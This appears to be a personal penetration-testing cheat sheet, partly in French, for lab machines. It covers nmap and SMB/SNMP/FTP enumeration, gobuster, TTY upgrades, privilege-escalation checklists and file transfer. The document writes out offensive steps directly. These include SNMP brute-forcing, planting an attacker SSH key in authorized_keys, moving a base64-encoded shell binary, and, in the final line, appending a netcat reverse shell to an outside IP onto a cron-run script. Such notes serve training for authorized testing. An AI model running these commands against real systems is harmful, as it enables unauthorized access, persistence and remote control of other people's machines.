
## Service Scanning

### nmap

scripts location : /usr/share/nmap/scripts

-sn : pas de scan port
-Pn : pas de host discovery

```bash
nmap 10.129.42.253

nmap -sn 10.129.42.253

nmap -sC -sV -vv -p- -o output 10.129.42.253

```


### Network attacks

Banner grabbing
```bash
nc -nv 10.129.42.253 21

FTP
nmap -sC -sV -p21 10.129.42.253
ftp -p 10.129.42.253

SMB
nmap --script smb-os-discovery.nse -445 10.10.10.40
nmap -A -p445 10.129.42.253
# -A = -O(detect OS) -sC et -sV 

smbclient -L \\\\10.129.42.253 -N
smbclient \\\\10.129.42.253\\users
smbclient -U bob \\\\10.129.42.253\\users

cherche et download : smbmap -u bob -p Welcome1 -R -H 10.129.42.254 -A flag.txt

SNMP
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c private 10.129.42.253

#bruteforce
onesixtyone -c dict.txt 10.129.42.254


```

## Web enum

#### Gobuster

 #gobuster

Directory and file enum

```bash

#dir mode
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-content/common.txt

#dns - subdomain enum
gobuster dns -d inlanefreight.com -w /usr/wordlists/seclists/Discovery/DNS/namelist.txt

```

banner grabbing Web server header

```bash

curl -IL https://www.inlanefreight.com

#get version of web servers utilities/tools/sw
whatweb 10.10.10.121

```

robots.txt
look the source code : f12 or ctrl+U

#### Upgrading TTY

```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw echo
fg

#from own device term
echo $TERM
#xterm-256color
stty size
#67 318

#back to victim
export TERM=xterm-256color
stty rows 67 columns 318

```

web shell web root :

IIS : C:\inetpub\wwwroot\
apache : /var/www/html
nginx : /usr/local/nginx/html
xampp : C:\xampp\htdocs

## Privesc

HackTricks/payloadsalltheThings for procédure and checklist

#### Enumeration scripts

Linux :
Linpeas
LinEnum
linuxprivchecker

Windows :
seatbelt
JAWS

#### Kernel exploit

---> searchsploit

#### Vuln software

Linux:
```bash
dpkg -l
```

windows:
check C:\Program Files

#### User Priv

sudo
SUID
Windows Token Privilèges

GTFOBins
LOLBAS & LOLLIBZ

Living off the land = utiliser les tools sur le terrain
#### Scheduled task

/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root

#### Exposed creds

bash_history
PSreadLine

#### SSH Keys

/home/user/.ssh/
/root/.ssh/

place our public key : /home/user/.ssh/authorized_keys
ssh-keygen

## File transfer

```bash

python3 -m http.server 8000

wget http://10.10.10121:8000/linenum.sh
# or
curl http://10.10.10121:8000/linenum.sh -o linenum.sh

```

#scp 
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

to bypass some restriction
#base64 
```bash
base64 shell -w 0

#copy/past

echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

```



10.10.14.157
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.157 8443 >/tmp/f' | tee -a monitor.sh